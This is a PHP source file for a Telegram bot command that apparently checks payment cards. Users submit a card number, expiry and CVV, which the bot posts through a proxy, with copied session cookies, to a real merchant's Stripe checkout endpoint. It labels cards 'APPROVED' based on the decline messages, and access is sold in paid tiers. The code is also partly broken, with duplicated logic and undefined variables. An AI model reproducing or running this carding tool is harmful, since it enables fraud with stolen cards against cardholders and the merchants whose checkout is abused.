<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');
//=========RANK DETERMINE=========//
$gate = "𝙎𝙃𝙊𝙋𝙄𝙁𝙔 + 𝙎𝙏𝙍𝙄𝙋𝙀 54$";

$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";

$paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "OWNER";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "OWNER";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "PAID";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "PAID";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}

//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//
$r = "0";
$gcm = "/sy";
$r = rand(0, 100);
//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/sy|\.sy|!sy)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username 𝘠𝘖𝘜 𝘈𝘙𝘌 𝘕𝘖𝘛 𝘗𝘙𝘌𝘔𝘐𝘜𝘔 𝘜𝘚𝘌𝘙  ❌</b>", $message_id);
        exit();
    }
    $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";
    $message = substr($message, 4);
    $messageidtoedit1 = bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "<b>𝙍𝙀𝘼𝘿𝙄𝙉𝙂 𝙐𝙍 𝙍𝙀𝙌𝙐𝙀𝙎𝙏 ✅</b>",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);
    $messageidtoedit = getstr(json_encode($messageidtoedit1), '"message_id":', ',');

    $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
    $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $amt = '1';
    if (empty($cc) || empty($cvv) || empty($mes) || empty($ano)) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "!𝙒𝙍𝙊𝙉𝙂 𝙁𝙊𝙍𝙈𝘼𝙏!%0A𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>$gcm cc|mm|yy|cvv</code>\n𝙂𝘼𝙏𝙀𝙒𝘼𝙔 - <b>$gate</b>",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
        return;
    };
    if (strlen($ano) == '4') {
        $an = substr($ano, 2);
    } else {
        $an = $ano;
    }
    $amount = $amt * 100;
    //------------Card info------------//
    $lista = '' . $cc . '|' . $mes . '|' . $an . '|' . $cvv . '';
  $ch = curl_init();

  $bin = substr($cc, 0, 6);

  curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $ch = curl_init();

    $bin = substr($cc, 0, 6);

    curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $bindata = curl_exec($ch);
    $binna = json_decode($bindata, true);
    $brand = $binna['scheme'];
    $country = $binna['country']['name'];
    $alpha2 = $binna['country']['alpha2'];
    $emoji = $binna['country']['emoji'];
    $type = $binna['type'];
    $category = $binna['category'];
    $bank = $binna['bank']['name'];
    $url = $binna['bank']['url'];
    $phone = $binna['bank']['phone'];
    curl_close($ch);

    $bank = "$bank";
    $country = "$country $emoji ";
    $bin = "$bin - ($alpha2) -[$emoji] ";
    $bininfo = "$type - $brand - $category";
    $url = "$url";
    $type = strtoupper($type);
    //------------Card info------------//

    # -------------------- [1 REQ] -------------------#
bot('editMessageText', [
          'chat_id' => $chat_id,
          'message_id' => $messageidtoedit,
          'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■□□□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
        'parse_mode' => 'html',
          'disable_web_page_preview' => 'true'
      ]);


    $proxie = null;
    $pass = null;
    $cookieFile = getcwd() . '/cookies.txt';

    function Capture2($str, $starting_word, $ending_word)
    {
        $subtring_start  = strpos($str, $starting_word);
        $subtring_start += strlen($starting_word);
        $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
        return substr($str, $subtring_start, $size);
    }


    $mes = ltrim($mes, '0');
    $ano = strlen($ano) == 2 ? '20' . $ano : $ano;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://random-data-api.com/api/v2/users?size=2&is_xml=true');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $randomuser = curl_exec($ch);
    curl_close($ch);
    $firstnme = trim(strip_tags(getstr($randomuser, '"first_name":"', '"')));
    $lastnme = trim(strip_tags(getstr($randomuser, '"last_name":"', '"')));



    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■□□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
      'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);

    #---- 2 REQ----

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.thechinanewyear.com/wp-content/plugins/ivacy-cart/inc/apinew.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: www.thechinanewyear.com';
$headers[] = 'path: /wp-content/plugins/ivacy-cart/inc/apinew.php';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.7';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://www.thechinanewyear.com';
$headers[] = 'referer: https://www.thechinanewyear.com/buy-vpn/';
$headers[] = 'Cookie: _gcl_au=1.1.1811202217.1703907246;countdown-timer-exit=1704036847083;_gid=GA1.2.2123170630.1703907247;__user_id=uid-4136533092.6355064144;_fbp=fb.1.1703907249790.1418301624;__stripe_mid=1c73e41b-7de8-4247-8c09-32484b3531adad9865;__stripe_sid=5c773394-7480-42a9-ac0e-d515c1427a2af9b77e;_hjFirstSeen=1;_hjIncludedInSessionSample_457749=1;_hjSessionUser_457749=eyJpZCI6IjQ3ZDA2MDZlLTFmZTQtNWEwMi04MGQ3LTc4MzA3YzljNmZjMyIsImNyZWF0ZWQiOjE3MDM5MDcyNTQxOTksImV4aXN0aW5nIjp0cnVlfQ==;_hjAbsoluteSessionInProgress=0;_hjSession_457749=eyJpZCI6IjE3ZmYyNDFmLTFkNGMtNDdhMy1iNDY0LTJiMjNkOGYwMmY4ZCIsImMiOjE3MDM5MDcyNTQyMDUsInMiOjEsInIiOjEsInNiIjowfQ==;gdprAgt=1;_gat_UA-60343498-1=1;_ga=GA1.1.1680700560.1703907247;_ga_VG0S96L69Y=GS1.1.1703907247.1.1.1703908617.38.0.0;_ga_JCYN1Y25S0=GS1.1.1703907246.1.1.1703908649.55.0.0';  
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'; 
$headers[] = 'X-Requested-With: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, "name=broken&email=broken%40gmail.com&iGDPRStatus=0&ga=GA1.1.1680700560.1703907247&aff_params=%7B%22aff_custom_1%22%3A%22%22%2C%22aff_custom_2%22%3A%22%22%2C%22aff_custom_3%22%3A%22%22%2C%22aff_custom_4%22%3A%22%22%2C%22aff_custom_5%22%3A%22%22%2C%22aff_custom_6%22%3A%22%22%2C%22aff_custom_7%22%3A%22%22%7D&affiliate_admitad_network=%7B%22aff_custom_1%22%3A%22%22%2C%22aff_custom_2%22%3A%22%22%2C%22aff_custom_3%22%3A%22%22%2C%22aff_custom_4%22%3A%22%22%2C%22aff_custom_5%22%3A%22%22%2C%22aff_custom_6%22%3A%22%22%2C%22aff_custom_7%22%3A%22%22%7D&sLanguage=en&sCurrency=USD&sDomain=www.thechinanewyear.com&action=signup&billingcylce=biennially&paymentmethod=stripe&promocode=&discount=&free_trial_days=0&free_trial_day_notaval=&prommo_discount=0&recurring_value=54&country=US&affiliate_id=&chan=&track_affid=&campaign_id=&affiliate_visit=&pap_referrer=&ref=&se=&sAddons=&dedicatedip_addon_prices=0&dedicatedip_addon_productid=0&portforwarding_addon_prices=0&portforwarding_addon_productid=0&total_price=54.00&cardid=5484&iSignUpType=1&iSubscriptionType=1&refurl=https%3A%2F%2Fwww.thechinanewyear.com%2F&data1=&data2=&ga_id=1680700560.1703907247&ga_session_count=1703907246&ga_session_id=1&iProductId=9&_wpnonce=61137addae&g-recaptcha-response=&campaign=&cardNumber=$cc&expMonth=$mes&expYear=$ano&cvc=$cvv");
  
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');



  bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
      'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);


    #------- 5 REQ

  $result2 = curl_exec($ch);
  $msg = trim(strip_tags(getStr($result2,'"genuineErrorMessage":"','"')));

  bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtoedit,
        'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■■
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
      'parse_mode' => 'html',
        'disable_web_page_preview' => 'true'
    ]);




if (strpos($r6, 'Thanks') || strpos($r6, 'security code is incorrect') || strpos($r6, 'Your card has insufficient funds.')) {
  $es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
  $msg = "$msg";
    } else {
    $es = "$dd";
        $msg = "$msg";
    }



$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
////////--[Responses]--////////


bot('editMessageText', [
'chat_id' => $chat_id,
'message_id' => $messageidtoedit,
'text' => "$es

𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>$gate</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>$msg</code>

𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$bininfo</code> 
𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$country</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
$botu",
'parse_mode' => 'html',
'disable_web_page_preview' => 'true'
]);


}
